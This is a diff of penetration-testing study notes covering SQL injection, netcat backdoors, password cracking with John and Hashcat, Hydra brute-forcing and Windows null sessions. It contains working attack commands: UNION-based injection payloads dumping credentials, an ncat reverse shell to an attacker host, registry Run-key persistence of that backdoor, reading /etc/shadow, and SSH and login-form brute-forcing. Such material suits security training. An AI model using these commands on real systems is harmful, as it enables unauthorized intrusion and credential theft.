@@ -450,11 +450,11 @@ nc -vu localhost 9999
 # => Server
 nc -lvp 8888 > received.txt
 # => Client
-echo "hello" | | nc -v localhost 8888
+echo "hello" | nc -v localhost 8888
 
 # Send file from Client to Server
 # => Server
-nv -lvp 8888 > received.txt
+nc -lvp 8888 > received.txt
 # => Client
 cat to_be_sent.txt | nc -v localhost 8888
 
@@ -701,11 +701,11 @@ To exploit a SQL injection you first need to know how many fields the vulnerable
 Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32
 ```
 
-- We can try with two fields: `' UNION SELECT null null; -- -` and three even to confirm that the original query only has two fields
-- Once we know how many fields are in the query it's time to test which fields are part of the output page
-- You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`
-- Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`
-- Not only `SELECT` queries are vulnerable
+- We can try with two fields: `' UNION SELECT null null; -- -` and three even to confirm that the original query only has two fields.
+- Once we know how many fields are in the query it's time to test which fields are part of the output page.
+- You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`.
+- Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`.
+- Not only `SELECT` queries are vulnerable.
 
 ### SQLMap
 
@@ -728,164 +728,195 @@ sqlmap -u 'http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=231&Submit=Submit#'
 sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D awd -T accounts --dump
 ```
 
-### System Attacks (6 items)
+#### From discord (to test)
 
+```sql
+1' UNION SELECT 1-- -
 
+3' AND sleep(5) -- -
 
+SELECT 1, schema_name,3 FROM information_schema.schemata limit 1,1-- -
 
+SELECT 1, table_name,3 FROM information_schema.tables WHERE table_schema=hotel limit 1,1-- -
 
+SELECT 1, column_name,3 FROM information_schema.columns WHERE table_schema=hotel and table_name=room limit 1,1
 
+SELECT 1, table_name,3 FROM information_schema.tables limit 1,1-- -
 
+SELECT group_concat(email,0x3a,Password) from awd.accounts limit 1,1;
+```
 
+## System Attacks
+### Backdoor
 
+Backdoors have two components, server and client:
+- *Server* runs on the victim machine listening on the network in order to accept connections.
+- *Client* runs on the attacker machine.
+- `Netbus` or `SubSeven` are very famous.
+- If the backdoor server sits behind a firewall, the easiest way to archive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**.
+- A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine.
 
+#### Create stable connection to a remote host
 
+```bash
+# => Listener
+ncat -l -v -p 5555 -e /bin/bash
+# => Client
+ncat localhost 5555
 
+## Reverse connection
+# => Attacker/Listener
+ncat -l -p 5555 -v
+# => Victim / Client
+ncat -e /bin/bash remoteIP remotePort
+```
 
+```bash
+# Persist execution in windows
+> regedit.exe
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run
 
+# Add string value
+Name: ncact
+Value: yourpath\ncat attackerMachine Port -e cmd.exe
+```
 
+### Password Attacks
 
+Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function. There are three main strategies:
 
+#### Brute force attacks
 
+> This method is only used when other attack vectors fail.
 
+You try them all by *generating* and testing all the possible valid passwords. Given enough time, a brute force attack is always successful.
 
+- Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
+- *John The Ripper*: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
+  - Fast because of the high use of parallelization, crack strategies
+  - `/etc/passwd`: contains info about user accounts
+  - `/etc/shadow`: contains info about the actual password hashes
+  - `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
+  - `john -incremental -users:<users list> <file to crack>`
+  - `john -incremental -users:victim crackme`
+  - To display the passwords recovered by `john`, use: `john --show <file>`
 
+#### Dictionary attacks
+- Common passwords
+- Faster than pure brute force attacks
+- Poorly chosen or default passwords are more exposed to dictionary cracking
+- `john -wordlist=<custom wordlist file> <file to crack>`
+- Install password dictionaries: `apt-get install seclists`
+  - You'll find them in `/usr/share/seclists/Passwords`
 
+- **Mangling words**
+  - Variations on dictionary words
+  - `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`
 
+#### Rainbow Tables**
+  - Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack.
+  - A rainbow table contains links between the results of a run of one hashing function and another.
+  - Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds.
+  - Great choice to crack simple and complex short passwords.
+  - `Ophcrack` rainbow cracking for Windows authentication passwords (can run on Linux too).
 
+### John the Ripper
 
+```bash
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=/usr/share/john/password.lst hashes.txt
+cat /root/.john/john.pot
+```
 
+### Hashcat
 
+```bash
+# -m hash-type
+# -a various attack mode
+# -b benchmark
+# -D specify the device
+# -O optimize performance
 
+> hashcat -b
 
-#### (1/6) Malware - Study Guide
+# Wordlist attack
+> hashcat -m 0 -a 0 -D2 example.hash example.dict
+# -m 0 md5 type of hash
+# -a 0 simple dictionary attack
 
-Any software used to misuse computer sistems with the intent to cause a DoS, spy on users activity, get aunauthorized control over one or more computer systems, etc.
+# Rules
+# Mutate dictionary words by setting different rules
+custom.rule:
 
-- **Virus**: small piece of code that spreads from computer to computer without any direct action or authorization by the owners of the infected machines, normally copying themselves to special sections of the HDD or inside legitimate programs or documents, running everytime an infected program or file is opened
-- **Trojan Horse**: comes embedded in seemingly harmless file, being _backdoors_ the most common
-- **Backdoors**: two components, server and client
-  - Server runs on the victim machine listening on the network in order to accept connections
-  - Client runs on the attacker machine
-  - `Netbus` or `SubSeven` are very famous
-  - If the backdoor server sits behind a firewall, the easiest way to achive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**
-  - A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine
-- **Rootkit**: designed to hide itself from users and antivirus programs in order to subvert the OS functioning, maintaining privileged access to the victim without being noticed
-- **Bootkit**: rootkits which circumvent OS protection mechanisms by executing during the bootstrap phase
-- **Adware**: annoying software that shows ads to computer users
-- **Spyware**: collects info about user's activity (OS, visited websites, passwords)
-- **Greyware**: either spyware, adware or both
-- **Dialer**: tries to dial numbers on dial-up connections in order to collect money from the victim's phone bill, nowadays targeting smartphones
-- **Keylogger**: special software that records every keystroke on the remote victim machine, winidow names and sends logs to a server controlled by the attacker
-  - **Hardware keyloggers**
-  - **Rootkit keyloggers**: stealthy and more invisible to the victim user than software keyloggers, hijacks the OS APIs to record keystrokes, intercepting the interrupt tables from the OS
-- **Bots**: small pieces of software that get installed on millions of machines to perform DoS, and remotelly commanded by a C&C server
-- **Ransomware**: encrypts a computer or smartphone with a secret key and aks its victim for a ransom
-- **Data Stealing Malware**: most of the time targeted to a specific company and tailored to work on the target environment
-- **Worms**: spread over the network by exploiting OS and SW vulnerabilities, exploiting credentials or misconfigurations to attack a service or a machine, usually worms are part of other software and they offer an entry point into the target system
+l
+u
+c
+r
+$1
+$2
+[
+]
+^1
+^a
+^!$!
 
-#### <span style="color:red">VIDEO - (2/6) Backdoor</span>
+# also hashcat comes with builtin rules
 
-#### (3/6) Password Attacks - Study Guide
+# Mask Attack
+# 5 letter passwords = 5 masks
+> hascat -m 0 -a 3 example.hash ?l?l?l?l
+```
 
-- Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function
-- _Password Cracking_ is the process of recovering clear-text passwords starting from their hash, where the attacker tries to guess the password
-- There are two main strategies:
-  - **Brute force attacks**
-    - You try them all!
-    - **Generate** and test all the possible valid passwords
-    - Given enough time, a brute force attack is always successful
-    - Only used when other attack vectors fail
-    - Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
-    - **John The Ripper**: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
-      - Fast because of the high use of parallelization, crack strategies
-      - `/etc/passwd`: contains info about user accounts
-      - `/etc/shadow`: contains info about the actual password hashes
-      - `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
-      - `john -incremental -users:<users list> <file to crack>`
-      - `john -incremental -users:victim crackme`
-      - To display the passwords recovered by `john`, use: `john --show <file>`
-  - **Dictionary attacks**
-    - Common passwords
-    - Faster than pure brute fornce attacks
-    - Poorly chosen or default passwords are more exposed to dictionary cracking
-    - `john -wordlist=<custom wordlist file> <file to crack>`
-    - Install password dictionaries: `apt-get install seclists`
-      - You'll find them in `/usr/share/seclists/Passwords`
-  - **Mangling words**
-    - Variations on dictionary words
-    - `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`
-  - **Rainbow Tables**
-    - Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack
-    - A rainbow table contains links between the results of a run of one hashing function and another
-    - Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds
-    - Great choice to crack simple and complex short passwords
-    - `Ophcrack` rainbow cracking for Windows authentication passwords (can run on Linux too)
-
-#### <span style="color:red">VIDEO - (4/6) John the Ripper</span>
-#### <span style="color:red">VIDEO - (5/6) Hashcat</span>
-
-#### (6/6) Buffer Overflow Attacks - Study Guide
+### Buffer Overflow Attacks
 
 A BoF attack can lead to:
-- An app or OS crash (DoS)
-- Privilege escalation
-- Remote code execution
-- Security features bypass
+
+- An app or OS crash (DoS).
+- Privilege escalation.
+- Remote code execution.
+- Security features bypass.
 
 A buffer is an area in the RAM reserved for temporary data storage:
-- User input
-- Parts of a video file
-- Server banners received by a client application
-- etc.
+
+- User input, parts of a video file, server banners received by a client application. etc.
 - Buffers have a finite size, therefore: if an app developer does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code
 
-##### Stack
+#### Stack
 
 - A stack is a data structure used to store data.
-- Two operation for LIFO stacks: `pop` & `push`
-- Space on the stack can be allocated from app's code
-- An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app
-- If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_
-- If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program
-- This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit
+- Two operation for LIFO stacks: `pop` & `push`.
+- Space on the stack can be allocated from app's code.
+- An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app.
+- If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_.
+- If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program.
+- This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit.
 
-Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills
+Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills.
 
-### Network Attacks (17 items)
+## Network Attacks
 
-#### (1/17) Authentication Cracking - Study Guide
+### Authentication Cracking
 
-A similar approach to cracking a password can be used for every service requiring network authentication as: ssh, telnet, remote desktop, HTTP authentication, etc.
+A similar approach to cracking a password can be used for every service requiring network authentication as: `ssh`, `telnet`, remote desktop, HTTP authentication, etc.
 
-##### Brute Force vs Dictionary Attacks
+### Brute Force vs Dictionary Attacks
 
-- Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe
-  - Network latency
-  - Delays on the attacked service
-  - Processing time on the attacked server
-- Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and defualt usernames and passwords
+Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe:
+
+- Network latency.
+- Delays on the attacked service.
+- Processing time on the attacked server.
+- Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and default usernames and passwords
 
 ##### Hydra
 
-- Fast, parallelized, network authentication cracker that supports different protocols:
-  - Cisco auth
-  - FTP
-  - HTTP
-  - IMAP
-  - RDP
-  - SMB
-  - SSH
-  - Telnet
+Fast, parallelized, network authentication cracker that supports different protocols: Cisco auth, `FTP`, `HTTP`, `IMAP`, `RDP`, `SMB`, `SSH`, `Telnet`...
 
-To get detailed information about a module:
 ```bash
+# To get detailed information about a module:
 hydra -U rdp
-```
 
-To launch a dictionary attack against a service:
-
-```bash
+# To launch a dictionary attack against a service:
 hydra -L users.txt -P pass.txt <service://server> <options>
 
 # For instance
@@ -893,72 +924,68 @@ hydra -L users.txt -P pass.txt telnet://target.server
 
 # Attack session against a password protected web resource
 hydra -L users.txt -P pass.txt http-get://localhost/
+
+# Brute-force login form
+# => See Module Info
+> hydra -U http-post-form
+# Our cmd
+> hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/sseclist/Passwords/rockyou-15.txt -f -V
+
+# Brute-force SSH
+hydra 10.10.10.3 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V
+
+# -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+# -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
 ```
-
-#### <span style="color:red">VIDEO - (2/17) Hydra: Authentication Cracking</span>
-#### <span style="color:red">LAB - (3/17) Bruteforce and Password cracking</span>
-
-#### (4/17) Windows Shares - Study Guide
+### Windows Shares
 
 > Ability to:
-> - Enumerate network resources
-> - Attack Windows sessions
-> - Obtain unauthorized access to Windows resources
+> - Enumerate network resources.
+> - Attack Windows sessions.
+> - Obtain unauthorized access to Windows resources.
 
-Windows' filesharing can be exploited.
-- NetBIOS (Network Basic Input Output System)
-  - Allows servers and clients to view network shares on a local area network
-  - It can supply some of the following information while querying computers:
-    - Hostname
-    - NetBIOS name
-    - Domain
-    - Network shares
-  - NetBIOS sits between the application layer and the IP layer (NetBIOS over TCP/IP)
-    - UDP is used to perform name resolution and to carry other one-to-many datagram-based communications (like send small messages to the rest of the other hosts)
-    - TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_
-  - MS Windows browses the network using NetBIOS to:
-    - Datagrams to list the sahres and the machines
-    - Names to find workgroups
-    - Sessions to transmit data to and from a Windows share
+Windows' filesharing can be exploited via *NetBIOS* (Network Basic Input Output System):
+- Allows servers and clients to view network shares on a local area network.
+- It can supply some of the following information while querying computers: Hostname, NetBIOS name, Domain, Network shares.
+- NetBIOS sits between the application layer and the IP layer (NetBIOS over TCP/IP).
+  - UDP is used to perform name resolution and to carry other one-to-many datagram-based communications (like send small messages to the rest of the other hosts).
+  - TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_.
+- MS Windows browses the network using NetBIOS to:
+  - Datagrams to list the shares and the machines.
+  - Names to find workgroups.
+  - Sessions to transmit data to and from a Windows share.
 
-##### Shares
+#### Shares
 
-An authorized user can access shares by using **UNC Paths (Universal Naming Concetion Paths**:
+An authorized user can access shares by using **UNC Paths (Universal Naming Connection Paths**:
 
-```
+```bash
 \\ServerName\ShareName\file.nat
-
 \\ComputerName\C$ # access to a volume (C$, D$, E$)
-
 \\ComputerName\admin$ # points to the windows installation directory
-
 \\ComputerName\ipc$  # used for inter-process communication, cannot be browsed via Explorer
 ```
 
-Badly configured shares exploitation can lead to:
-- Information disclosure
-- Unauthorized file access
-- Information leakage used to mount a targeted attack
+> Badly configured shares exploitation can lead to:
+> - Information disclosure.
+> - Unauthorized file access.
+> - Information leakage used to mount a targeted attack.
 
-#### (5/17) Null Sessions - Study Guide
+### Null Sessions
 
-- Null session attacks can be used to enumerate a lot of information:
-  - Passwords
-  - System users
-  - System groups
-  - Running system processes
-- Remotely exploitable
-- Nowadays Windows is configured to be immune to this kidn of attack
-- Applicable to legacy systems
-- Exploits an authentication vulnerability for Windows Adminstrative Shares, lets an attacker connect to a local or remote share wihtout authentication
-- Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions
+Null session attacks can be used to enumerate a lot of information: Passwords, System users, System groups, Running system processes.
+- Remotely exploitable.
+- Nowadays Windows is configured to be immune to this kind of attack.
+- Applicable to legacy systems.
+- Exploits an authentication vulnerability for Windows Administrative Shares, lets an attacker connect to a local or remote share without authentication.
+- Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions.
 
-##### Tools
+#### Tools
 
-- `nbstat`: windows cmd tool that can display info about the target
-- `nbstat -A <IP>`: displays info about a target
+- `nbstat`: windows cmd tool that can display info about the target.
+- `nbstat -A <IP>`: displays info about a target.
 
-```
+```bash
 Name                Type      Status
 ----------------------------------------
 ELS-WINXP     <00>  UNIQUE    Registered
@@ -976,12 +1003,12 @@ ELS-WINXP     <20>  UNIQUE    Registered
 NET VIEW <target IP>
 ```
 
-- Share enumeration from a Linux Machine is provided by the *Samba suite*
-- `nmblookup -A <target ip address>` gets the same results as `NET VIEW <target_IP>`
+- Share enumeration from a Linux Machine is provided by the *Samba suite*.
+- `nmblookup -A <target ip address>` gets the same results as `NET VIEW <target_IP>`.
 
 `smbclient` also displays *shares that are hidden when using Windows standard tools*:
 
-```
+```bash
 # To enumerate the shares provided by a host
 smbclient -L //<target_IP> -N
 
@@ -1015,7 +1042,6 @@ enum -P <target>  # -P check the password policy
   - Prevent false positives
   - Choose your dictionary or your bruteforcer configuration (as knowing the min and max lengh of a password helps to save time)
 
-
 ##### Exploiting Null Session with Winfo
 
 Automates null session exploitation.
@@ -1038,6 +1064,26 @@ A PERL script that can perform the same operations of `enum` and `winfo`, supply
 - Printer information extraction
 
 #### <span style="color:red">VIDEO - (6/17) Null Session</span>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 #### <span style="color:red">LAB - (7/17) Null Session</span>
 
 #### (8/17) ARP Poisoning - Study Guide
